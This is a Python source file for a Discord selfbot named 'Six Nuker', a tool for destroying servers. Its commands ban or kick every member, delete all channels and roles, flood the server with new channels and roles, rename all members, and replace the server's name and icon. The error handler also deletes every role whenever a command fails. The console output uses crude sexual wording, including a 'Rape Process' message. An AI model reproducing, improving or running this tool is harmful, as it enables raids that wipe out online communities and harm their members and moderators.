import discord
import aiohttp
import time
import asyncio
import os
import numpy
import ctypes
import colorama
from datetime import datetime
from colorama import Fore
import json
import random
from discord.utils import find
import random
from discord.ext import tasks
from discord.ext import commands
import requests
ctypes.windll.kernel32.SetConsoleTitleW(f"Six Nuker")

with open('config.json') as f:

    config = json.load(f)
token = config.get('token')
prefix = config.get('prefix')
wizzn = config.get('wizzname')
stream_url = config.get('stream_url')

colorama.init()
client = discord.Client()
client = commands.Bot(description='six nuker',command_prefix=prefix,self_bot=True)
client.remove_command('help') 


client.sniped_message_dict = {}
client.sniped_edited_message_dict = {}





def getBanner():
    banner = f'''{Fore.RESET}

                          ██████  ██▓▒██   ██▒    ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
                        ▒██    ▒ ▓██▒▒▒ █ █ ▒░    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
                        ░ ▓██▄   ▒██▒░░  █   ░   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
                          ▒   ██▒░██░ ░ █ █ ▒    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
                        ▒██████▒▒░██░▒██▒ ▒██▒   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
                        ▒ ▒▓▒ ▒ ░░▓  ▒▒ ░ ░▓ ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
                        ░ ░▒  ░ ░ ▒ ░░░   ░▒ ░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
                        ░  ░  ░   ▒ ░ ░    ░        ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
                              ░   ░   ░    ░              ░    ░     ░  ░      ░  ░   ░     
                                                                   

                                          
{Fore.RESET}[{Fore.RED}-{Fore.RESET}] {prefix}{Fore.RED}six          {Fore.RESET}[{Fore.RED}SIX SPECIALL!!!{Fore.RESET}] 
{Fore.RESET}[{Fore.RED}-{Fore.RESET}] {prefix}{Fore.RED}ban          {Fore.RESET}[{Fore.RED}Bans All In Server{Fore.RESET}]
{Fore.RESET}[{Fore.RED}-{Fore.RESET}] {prefix}{Fore.RED}kick         {Fore.RESET}[{Fore.RED}Kicks All In Server{Fore.RESET}]
{Fore.RESET}[{Fore.RED}-{Fore.RESET}] {prefix}{Fore.RED}massc        {Fore.RESET}[{Fore.RED}Creates Channels{Fore.RESET}]
{Fore.RESET}[{Fore.RED}-{Fore.RESET}] {prefix}{Fore.RED}dels         {Fore.RESET}[{Fore.RED}Deletes Channes{Fore.RESET}]
{Fore.RESET}[{Fore.RED}-{Fore.RESET}] {prefix}{Fore.RED}nickA        {Fore.RESET}[{Fore.RED}Nicknames all{Fore.RESET}]
{Fore.RESET}[{Fore.RED}-{Fore.RESET}] {prefix}{Fore.RED}delC         {Fore.RESET}[{Fore.RED}Deletes & Creates{Fore.RESET}]
{Fore.RESET}[{Fore.RED}-{Fore.RESET}] {prefix}{Fore.RED}glee         {Fore.RESET}[{Fore.RED}purges everything{Fore.RESET}]

                                                                               

		'''.replace('░', f'{Fore.WHITE}░{Fore.RESET}').replace('▒', f'{Fore.RED}░{Fore.RESET}').replace('▓', f'{Fore.RED}░{Fore.RESET}')
    return banner
print(getBanner())     


def Init():
    if config.get('token') == "token-here":
        os.system('cls')
        print(f"{Fore.RESET}[ERROR] {Fore.RED}You didnt put your token in the config.json file"+Fore.RESET)
    else:
        token = config.get('token')
        try:
            client.run(token, reconnect=True)
        except discord.errors.LoginFailure:
            os.system("cls")     
            print(f"{Fore.RESET}[ERROR] {Fore.RED}this token ain't workin my guy"+Fore.RESET)
            os.system('pause >NUL')


@client.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"{Fore.RED}error: {Fore.WHITE}You're missing permission to execute this command"+Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Fore.RED}error: {Fore.WHITE}Missing arguments: {error}"+Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.RED}error: {Fore.WHITE}Not a valid image"+Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Fore.RED}error: {Fore.WHITE}Discord error: {error}"+Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(f"{Fore.RED}error: {Fore.WHITE}Couldnt send a empty message"+Fore.RESET)               
    else:
        print(f"{Fore.RED}error: {Fore.LIGHTYELLOW_EX}{error_str}"+Fore.RESET)



    for role in (ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

@client.command()
async def six(ctx):
        os.system("cls")    
        print(getBanner())  
        ban = -1
        delete = 0
        create = 0
        roles = 0
        rolez = 0
        await ctx.message.delete()
        print(f"{Fore.RESET}> {Fore.RED}Running Rape Process{Fore.RESET}...\n")
        for member in ctx.guild.members:
            try:
                ban += 1
                await member.ban()
            except:
                continue
        print(f"\n{Fore.RESET}> {Fore.RED}Successfully Banned [{Fore.RESET}{ban}{Fore.RED}] Members{Fore.RESET}.")
        
        for channel in ctx.guild.channels:
                try:
                    delete += 1
                    await channel.delete()
                except:
                    continue    
        print(f"{Fore.RESET}> {Fore.RED}Successfully Removed [{Fore.RESET}{delete}{Fore.RED}] Channels{Fore.RESET}.")  
        
        for i in range(16):
            try:
                create += 3
                await ctx.guild.create_text_channel(name=f'{wizzn} {i}')
                await ctx.guild.create_voice_channel(name=f'{wizzn} {i}')
                await ctx.guild.create_category(name=f'{wizzn} {i}')
            except:
                continue
        print(f"{Fore.RESET}> {Fore.RED}Successfully Created [{Fore.RESET}{create}{Fore.RED}] Channels{Fore.RESET}.")      
        with open('trans.gif', 'rb') as porn:
            data = porn.read()
            await ctx.guild.edit(icon=data)
            await ctx.guild.edit(name=wizzn)
        print(f'{Fore.RED}[{Fore.RESET}Status{Fore.RED}] Guild Icon: {Fore.RED}[{Fore.RESET}Changed{Fore.RED}]')
        print(f'{Fore.RED}[{Fore.RESET}Status{Fore.RED}] Changed Guild Name To: {Fore.RED}[{Fore.RESET}{wizzn}{Fore.RED}]\n')



@client.command()
async def ban(ctx):
    os.system("cls")    
    print(getBanner())  
    tit = -1
    await ctx.message.delete()
    print(f"{Fore.RESET}> {Fore.RED}Running ban process{Fore.RESET}...")
    for member in ctx.guild.members:
        try:
            tit += 1
            await member.ban()
            print(f"{Fore.RED}[{Fore.RESET}Status{Fore.RED}] Banned{Fore.RESET}: {Fore.RED}[{Fore.RESET}{member}{Fore.RED}]")
        except:
            continue
    print(f"\n{Fore.RESET}> {Fore.RED}Successfully Banned [{Fore.RESET}{tit}{Fore.RED}] Members{Fore.RESET}.")
    
@client.command()
async def massr(ctx):
    await ctx.message.delete()
    for i in range(900):
        try:
            await ctx.guild.create_role(name=wizzn, color=discord.Colour(random.randint(0x000000, 0xFFFFFF)))
        except:
            return 
@client.command() 
async def delR(ctx):
    await ctx.message.delete()
    for role in (ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
@client.command()
async def nickA(ctx):
    os.system("cls")    
    print(getBanner())  
    await ctx.message.delete()
    print(f"{Fore.RESET}> {Fore.RED}Running nickall{Fore.RESET}...")
    for member in ctx.guild.members:
        try:
            await member.edit(nick=wizzn)
            print(f"{Fore.RED}[{Fore.RESET}Status{Fore.RED}] Changed {member} nickname to {wizzn}")
        except:
            print(f"{Fore.RESET}> {Fore.RED}Successfully change nicknames{Fore.RESET}.")

@client.command()
async def kick(ctx):
    os.system("cls")    
    print(getBanner())  
    gog = -1
    await ctx.message.delete()
    print(f"{Fore.RESET}> {Fore.RED}Running kick process{Fore.RESET}...")
    for member in ctx.guild.members:
            try:
                gog += 1
                await member.kick()
                print(f"{Fore.RED}[{Fore.RESET}Status{Fore.RED}] Kicked{Fore.RESET}: {Fore.RED}[{Fore.RESET}{member}{Fore.RED}]")
            except:
                continue
    print(f"\n{Fore.RESET}> {Fore.RED}Successfully Kicked [{Fore.RESET}{gog}{Fore.RED}] Members{Fore.RESET}.")            

@client.command()
async def dels(ctx):
    anal = 0
    os.system("cls")    
    print(getBanner())
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        anal += 1
        await channel.delete()
    print(f"{Fore.RESET}> {Fore.RED}Successfully Removed [{Fore.RESET}{anal}{Fore.RED}] Channels{Fore.RESET}.") 
@client.command()
async def delC(ctx):
    os.system("cls")    
    print(getBanner()) 
    dick = 0 
    pussy = 0
    await ctx.message.delete()
    for channel in ctx.guild.channels:
            try:
                pussy += 1
                await channel.delete()
            except:
                continue    
    print(f"{Fore.RESET}> {Fore.RED}Successfully Removed [{Fore.RESET}{pussy}{Fore.RED}] Channels{Fore.RESET}.")               
    for i in range(1, 16):
        try:
            dick += 3
            await ctx.guild.create_text_channel(name=f'{wizzn} {i}')
            await ctx.guild.create_voice_channel(name=f'{wizzn} {i}')
            await ctx.guild.create_category(name=f'{wizzn} {i}')
        except:
            pass
    print(f"{Fore.RESET}> {Fore.RED}Successfully Created [{Fore.RESET}{dick}{Fore.RED}] Channels{Fore.RESET}.") 

@client.command()
async def massc(ctx):
    os.system("cls")    
    print(getBanner())  
    created2 = 0
    await ctx.message.delete()
    for i in range(1, 16):
        try:
            created2 += 3
            await ctx.guild.create_text_channel(name=f'{wizzn} {i}')
            await ctx.guild.create_voice_channel(name=f'{wizzn} {i}')
            await ctx.guild.create_category(name=f'{wizzn} {i}')
        except:
                pass
    print(f"{Fore.RED}[{Fore.RESET}Status{Fore.RED}] Added:{Fore.RED} {created2} channels ")
@client.command()
async def glee(ctx, limit: int=None):
    async for message in ctx.message.channel.history(limit=None).filter(lambda m: m.author == client.user):
            try:
                await message.delete()
            except:
                pass

@client.command(pass_context=True, aliases=["cyclename", "autoname", "autonick", "cycle"])
async def renick(ctx, *, text):
    await ctx.message.delete()
    global cycling
    cycling = True
    while cycling:
        name = ""
        for letter in text:
            name = name + letter
            await ctx.message.author.edit(nick=name)


@client.command(aliases=["stopcyclename", "cyclestop", "stopautoname", "stopautonick", "stopcycle"])
async def srenick(ctx):
    await ctx.message.delete()
    global cycling
    cycling = False
    



@client.command()
async def cls(ctx):
    await ctx.message.delete()
    os.system("cls")    
    print(getBanner())    
if __name__ == '__main__':
	Init()

